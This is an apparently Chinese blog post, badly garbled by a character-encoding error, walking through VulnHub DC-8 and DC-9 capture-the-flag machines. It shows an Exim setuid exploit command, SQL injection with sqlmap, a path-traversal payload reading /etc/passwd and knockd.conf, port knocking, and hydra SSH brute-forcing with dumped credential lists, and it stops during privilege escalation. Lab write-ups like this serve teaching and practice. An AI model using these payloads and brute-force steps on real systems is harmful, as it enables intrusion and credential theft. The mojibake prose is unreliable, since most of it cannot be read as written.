<li>æˆ‘ä»æœ‰äººè¯¢é—®å…³äº Linux æœºå™¨ä¸Šçš„ 2FA ä»¥åŠå®ƒæ˜¯å¦å€¼å¾—çš„ä¸€æ¡æ¨æ–‡ã€‚</li>
<li>æ¥è‡ª@theart42 çš„å»ºè®®</li>
</ol>
<p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯â€¦â€¦</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p>ã€æ³¨æ„ï¼Œè¿™ä¸ªææƒä¸ç¨³å®šï¼Œæ‰€ä»¥éœ€è¦å¿«ç‚¹æ‹¿å–<code>flag</code>ï¼Œæˆ–è€…æŒ‰æˆ‘ä¹‹å‰å†™çš„æ–¹æ³•è¿›å…¥ç¨³å®š<code>shell</code>ã€‘</p>
<hr>
<h3><span id="ps-setuid">p.s. setuid</span></h3><p>æˆ‘å†è¯•è¯•å¦å¤–ä¸€ä¸ªå‘½ä»¤è¯•è¯•</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></p>
<p>å‘ç°è¿˜æ˜¯ä¸€æ ·</p>
<p>æŸ¥äº†ä¸€ä¸‹</p>
<blockquote>
<p><code>setuid</code></p>
<p><code>setuid</code>æ˜¯ç±»unixç³»ç»Ÿæä¾›çš„ä¸€ä¸ªæ ‡å¿—ä½ï¼Œ å…¶å®é™…æ„ä¹‰æ˜¯setä¸€ä¸ªprocessçš„euidä¸ºè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç¨‹åºçš„æ‹¥æœ‰è€…(æ¯”å¦‚root)çš„uidï¼Œ ä¹Ÿå°±æ˜¯è¯´å½“setuidä½è¢«è®¾ç½®ä¹‹åï¼Œ å½“æ–‡ä»¶æˆ–ç¨‹åº(ç»Ÿç§°ä¸ºexecutable)è¢«æ‰§è¡Œæ—¶, æ“ä½œç³»ç»Ÿä¼šèµ‹äºˆæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™, å› ä¸ºå…¶euidæ˜¯æ–‡ä»¶æ‰€æœ‰è€…çš„uid.</p>
</blockquote>
<p>è€Œä¸”æˆ‘ä»¬æ‰§è¡Œå®Œå‘ç°ç”Ÿæˆäº†ä¸¤ä¸ª<code>pwn</code>æ–‡ä»¶ã€ç‹‚å–œï¼Œæœ€è¿‘æ­£å¥½åœ¨å­¦ä¹ <code>pwn</code>ã€‘</p>
<p>æŸ¥äº†ä¸€ä¸‹<code>setuid</code>åœ¨<code>pwn</code>ä¸­çš„åˆ©ç”¨</p>
<h4><span id="åœ¨pwnä¸­">åœ¨pwnä¸­</span></h4><p><code>ä»€ä¹ˆæ˜¯setuidï¼Ÿ</code></p>
<blockquote>
<p><code>setuid</code>ä»£è¡¨è®¾ç½®ç”¨æˆ·èº«ä»½ï¼Œå¹¶ä¸”<code>setuid</code>è®¾ç½®è°ƒç”¨è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDï¼Œç”¨æˆ·è¿è¡Œç¨‹åºçš„uidä¸è°ƒç”¨è¿›ç¨‹çš„çœŸå®uidä¸åŒ¹é…</p>
</blockquote>
<p>è¿™ä¹ˆè¯´èµ·æ¥æœ‰ç‚¹ç»•ï¼Œæˆ‘ä»¬æ¥ä¸¾ä¸€ä¸ªä¾‹å­</p>
<blockquote>
<p>ä¸€ä¸ªè¦ä»¥rootæƒé™è¿è¡Œçš„ç¨‹åºï¼Œä½†æˆ‘ä»¬æƒ³è®©æ™®é€šç”¨æˆ·ä¹Ÿèƒ½è¿è¡Œå®ƒï¼Œä½†åˆè¦é˜²æ­¢è¯¥ç¨‹åºè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨çš„setuidäº†</p>
</blockquote>
<p>æ¼”ç¤º<br>æˆ‘ä»¬ç”¨<code>user</code>ç”¨æˆ·è¿è¡Œä¸€ä¸ª<code>vim</code><br>ç„¶åæ–°å¼€ä¸€ä¸ªçª—å£æŸ¥çœ‹åå°è¿›ç¨‹</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„<code>vim</code>æ­£åœ¨ä»¥<code>user</code>çš„æƒé™è¿è¡Œä¸­ï¼Œç„¶åæˆ‘ä»¬å»æ‰§è¡Œä¸€ä¸‹<code>setuid</code>æ–‡ä»¶çœ‹çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è™½ç„¶æ˜¯<code>user</code>ç”¨æˆ·ï¼Œä½†æ‰§è¡Œæ–‡ä»¶åï¼Œæ–‡ä»¶æ­£ä»¥<code>root</code>æƒé™è¿è¡Œ<br>æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶çš„æƒé™</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></p>
<blockquote>
<p><code>r</code>ä»£è¡¨è¯»ï¼Œ<code>w</code>ä»£è¡¨å†™ï¼Œ<code>x</code>ä»£è¡¨æ‰§è¡Œï¼Œé‚£<code>s</code>æ˜¯ä»€ä¹ˆå‘¢</p>
</blockquote>
<p><code>s</code>æ›¿æ¢äº†ä»¥<code>x</code>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™è¢«ç§°ä¸º<code>setuid</code>ä½ï¼Œæ ¹æ®åˆšåˆšçš„æ“ä½œï¼Œåº”è¯¥çŸ¥é“äº†<code>s</code>æ˜¯åšä»€ä¹ˆçš„</p>
<p>å½“è¿™ä¸ªä½è¢«<code>user</code>æƒé™çš„ç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œ<code>linux</code>å®é™…ä¸Šæ˜¯ä»¥æ–‡ä»¶çš„åˆ›é€ è€…çš„æƒé™è¿è¡Œçš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä»¥<code>root</code>æƒé™è¿è¡Œçš„</p>
<p><strong>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ï¼Œç ´è§£(pwn)è¿™äº›æ–‡ä»¶ç„¶åæ‹¿åˆ°<code>root</code>æƒé™è¯»å–<code>flag</code></strong></p>
<p>è¿™ä¹Ÿå°±æ˜¯è¿™ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>



<blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå…¶å®å°±æ˜¯<code>suid</code>ææƒ</p>
<p>ä½†è¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºé¶æœºçš„åŸå› æ— æ³•æ‰§è¡ŒææƒæˆåŠŸ</p>
</blockquote>
<hr>
<p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸€å…³åªæ˜¯åœ¨<code>DC2</code>ä¸Šä¿®æ”¹äº†ä¸€ç‚¹ï¼Œåªè¦æŠŠå‰é¢å‡ å…³åšäº†ï¼Œè¿™å…³éš¾åº¦å¹¶ä¸å¤§</p>
<p>ã€</p>
<p>éš¾å—çš„æ˜¯é‡åˆ°<code>pwn</code>ï¼Œè™½ç„¶åœ¨è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°è¿™ç±»äºŒè¿›åˆ¶æ–‡ä»¶å¦‚ä½•ä¿®æ”¹æ‰èƒ½è®©å…¶æˆä¸ºæˆ‘ä»¬ææƒçš„å·¥å…·ï¼Œ</p>
<p>è€Œä¸”ç°åœ¨äºŒè¿›åˆ¶è¿˜å•¥ä¹Ÿä¸ä¼šï¼Œç»§ç»­å­¦ä¹ å§</p>
<p>ã€‘</p>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p>
<hr>
<h1><span id="ä¹-dc9ä¸­çº§">ä¹ã€DC9[ä¸­çº§]</span></h1><p><strong>only one flag</strong></p>
<blockquote>
<p>ï¼ˆdcæœ€åä¸€å…³ï¼‰å»ºè®®å¯ä»¥è‡ªå·±æƒ³åŠæ³•åšä¸€ä¸‹ï¼Œå¦‚æœä¹‹å‰æ˜¯é åˆ«äººwpæ¥æä¾›æ€è·¯çš„è¯</p>
</blockquote>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></p>
<p>ç»“æœå‘ç°åªæœ‰<code>80</code>ç«¯å£æ˜¯æ‰“å¼€çš„</p>
<p>è€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„ä¿¡æ¯</p>
<p>ç„¶åå†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></p>
<p>ç»“æœæ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></p>
<p>åœ¨<code>wappalyzer</code>é‡Œä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆä¿¡æ¯ï¼Œ<code>CMS</code>ä¹Ÿæ²¡æ˜¾ç¤º</p>
<h2><span id="1sqlæ³¨å…¥">1.sqlæ³¨å…¥</span></h2><p>å•¥ä¹Ÿæ²¡æœ‰ä¿¡æ¯ï¼Œä½†æ˜¯åœ¨<code>display all records</code>ä¸‹</p>
<p>æˆ‘ä»¬çœ‹åˆ°ä¸€å¤§ä¸²æšä¸¾æ•°æ®ï¼Œå¾ˆç†Ÿæ‚‰ï¼Œè¿™å’Œ<code>sql</code>æ³¨å…¥æ„Ÿè§‰æœ‰å¾ˆå¤§çš„å…³ç³»</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></p>
<p>æ‰¾äº†ä¸€ä¸‹å‘ç°<code>url</code>å¹¶æ²¡æœ‰<code>sql</code>æ³¨å…¥çš„æ–¹å¼ï¼Œé‚£å°±å¯èƒ½æ˜¯è¾“å…¥æ¡†è¿›è¡Œ<code>sql</code>æ³¨å…¥äº†</p>
<p>æ ¹æ®æšä¸¾çš„æ•°æ®ï¼ŒçŒœæµ‹æ˜¯åœ¨<code>search</code>ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></p>
<p>æˆ‘ä»¬ç›´æ¥æŠ“åŒ…æ•°æ®ï¼Œæ‹¿<code>sqlmap</code>æ¢­å“ˆ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></p>
<p>å¥½å®¶ä¼™çœŸçš„æ˜¯<code>sql</code>æ³¨å…¥</p>
<p>åé¢ä¸èµ˜è¿°ï¼Œæ‰¾åˆ°å¹¶æŸ¥çœ‹<code>users</code>æ•°æ®åº“ä¸­ç”¨æˆ·ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<p>å¥½å®¶ä¼™ï¼Œå®Œå…¨æ²¡æœ‰å¯¹å¯†ç åŠ å¯†</p>
<p>ä½†æ˜¯æ ¹æ®ç™»å½•é¡µé¢ï¼Œæ˜¯éœ€è¦ç®¡ç†å‘˜è´¦å·çš„ï¼Œå†æ ¹æ®<code>staff</code>ï¼Œçœ‹æ¥æˆ‘æ˜¯æ‰¾é”™è¡¨äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></p>
<p>äºæ˜¯æŒ‰ä¸Šé¢ä¸€æ ·æ­¥éª¤ï¼ŒæŸ¥çœ‹<code>Staff</code>æ•°æ®åº“é‡Œçš„ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></p>
<p>æœç„¶åœ¨è¿™é‡Œ</p>
<blockquote>
<p><code>transorbital1</code><br>æˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯å•¥å¯†é’¥ï¼Œç»“æœæ˜¯å¯†ç æ˜æ–‡ï¼Œéº»äº†</p>
<p>å½“ç„¶æ—¶é—´å……è¶³çš„å…„å¼Ÿå¯ä»¥hashcatè¯•è¯•ã€åç¬‘ã€‘</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></p>
<p>æˆåŠŸç™»å½•</p>
<h2><span id="2æ–‡ä»¶åŒ…å«">2.æ–‡ä»¶åŒ…å«</span></h2><p>å‘ç°å¤šäº†ä¸¤ä¸ªé€‰é¡¹æ˜¯ï¼Œä¸€ä¸ªæ˜¯å¢åŠ ç”¨æˆ·ï¼Œå¦ä¸€ä¸ªæ˜¯ç™»å‡ºè´¦å·</p>
<p>ä½†æ˜¯æˆ‘çªç„¶å‘ç°</p>
<p>åº•ä¸‹è«åå¤šäº†ä¸€è¡Œå­—</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure>

<p>ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>å“ªé‡Œæ¥çš„<code>file</code>ï¼Œçœ‹æ¥æ˜¯è¿›è¡Œäº†è¯»å–æ–‡ä»¶æ“ä½œï¼Œä½†æ˜¯æ–‡ä»¶å‚æ•°ä¸å­˜åœ¨</p>
<p>çŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>äºæ˜¯æˆ‘ä»¬åœ¨<code>url</code>ååŠ ä¸Š<code>?file=</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>è¿”å›åˆ°æ ¹ç›®å½•ä¸‹ï¼ŒåŒ…å«&#x2F;etcç›®å½•ä¸‹çš„passwdæ–‡ä»¶</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></p>
<p>ä½†è¿™é‡Œå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œ</p>
<h2><span id="3ssh">3.ssh</span></h2><h3><span id="1-knockd">1ï¼‰ knockd</span></h3><blockquote>
<p>åœ¨1920å¹´ä»£ï¼Œå½“ç¦ä»¤å¦‚ç«å¦‚è¼åœ°è¿›è¡Œæ—¶ï¼Œå¦‚æœæ‚¨æƒ³è¿›å…¥è¯´è¯çŠ¶æ€ï¼Œå°±å¿…é¡»çŸ¥é“ç§˜å¯†çš„æ•²é—¨å£°ï¼Œå¹¶æ­£ç¡®åœ°æ•²æ‰“å®ƒæ‰èƒ½è¿›å…¥å†…éƒ¨ã€‚</p>
<p>ç«¯å£æ•²é—¨æ˜¯ç°ä»£çš„ç­‰åŒç‰©ã€‚ å¦‚æœæ‚¨å¸Œæœ›äººä»¬å¯ä»¥è®¿é—®æ‚¨è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œä½†åˆä¸æƒ³å°†é˜²ç«å¢™æ‰“å¼€åˆ°<del>Internet</del>ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç«¯å£æ–­å¼€åŠŸèƒ½ã€‚<br>å®ƒå…è®¸æ‚¨å…³é—­é˜²ç«å¢™ä¸Šå…è®¸ä¼ å…¥è¿æ¥çš„ç«¯å£ï¼Œå¹¶åœ¨è¿›è¡Œ<code>é¢„å…ˆå®‰æ’çš„è¿æ¥å°è¯•</code>æ–¹å¼æ—¶è‡ªåŠ¨æ‰“å¼€å®ƒä»¬ã€‚ è¿æ¥å°è¯•çš„é¡ºåºå……å½“ç§˜å¯†æ•²é—¨ã€‚ å¦ä¸€ä¸ªç§˜å¯†çš„æ•²é—¨å£°å…³é—­äº†æ¸¯å£ã€‚</p>
</blockquote>
<p>æˆ‘åœ¨å­¦ä¹ ç¬”è®°å†™æœ‰å…¶åŸç†ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œæˆ‘ä¸åœ¨è¿™é‡Œèµ˜è¿°</p>
<p>å…ˆæŸ¥çœ‹æ•²é—¨é¡ºåº</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></p>
<p>å‘ç°æ˜¯</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p>æ•²ä¸€ä¸‹</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></p>
<p>ç„¶åå†ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>22</code>ç«¯å£å¼€äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></p>
<h3><span id="2-hydra">2ï¼‰ hydra</span></h3><p>ç„¶åæˆ‘ä»¬ç”¨ä¹å¤´è›‡çˆ†ç ´ç™»å½•ä¸€ä¸‹<code>ssh</code></p>
<p>è‡³äºè´¦æˆ·å¯†ç å°±ç”¨æˆ‘ä»¬ä¹‹å‰<code>sql</code>æ³¨å…¥å¾—åˆ°çš„ç¬¬ä¸€ä¸ªçš„æ•°æ®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></p>
<blockquote>
<p>usernameï¼š<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p>
</blockquote>
<blockquote>
<p>passwordï¼š<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p>
</blockquote>
<p>æŠŠ<code>username</code>å’Œ<code>password</code>å¤åˆ¶åˆ°ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­å»</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªå¯ä»¥ç™»å½•</p>
<blockquote>
<p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p>æˆ‘ä»¬å…ˆç™»å½•<code>janitor</code></p>
<blockquote>
<p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></p>
<p>ç™»å½•æˆåŠŸ</p>
<h2><span id="4ææƒ">4.ææƒ</span></h2><p>å…ˆæ‰§è¡Œ </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹å½“å‰ç”¨æˆ·èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></p>
<p>çœ‹æ¥æˆ‘ä»¬æ²¡æœ‰èµ„æ ¼</p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></p>
<p>å‘ç°æœ‰ä¸ª</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure>

<p>å¯èƒ½æœ‰ç®¡ç†å‘˜å¯†ç ä»€ä¹ˆçš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></p>
<p>æœç„¶æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ŒæŸ¥çœ‹</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></p>
<p>åˆå¤šäº†å‡ ä¸ªå¯†ç </p>
<blockquote>
<p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p>
</blockquote>
<p>æˆ‘ä»¬æŠŠè¿™ä¸ªè¡¥å……åˆ°æˆ‘ä»¬ä¹å¤´è›‡çˆ†ç ´çš„å¯†ç æœ¬é‡Œ</p>
<p>å†è¿›è¡Œçˆ†ç ´<code>ssh</code></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°å¤šäº†ä¸€ä¸ªæ–°çš„è´¦å·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></p>
<blockquote>
<p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p>
</blockquote>
<p>æˆ‘ä»¬ç™»å½•<code>ssh</code>çœ‹çœ‹</p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></p>
<p>å‘ç°å…¶å¯ä»¥ä»¥æ— å¯†ç <code>root</code>æƒé™æ‰§è¡Œ</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è¯•è¯•</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></p>
<p>æç¤ºæˆ‘ä»¬æœ‰ä¸ªtest.pyæ­£åœ¨è¢«è¯»å–ä½¿ç”¨</p>
<p>æˆ‘ä»¬æ‰¾ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨å“ªé‡Œ</p>
<blockquote>
<p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p>
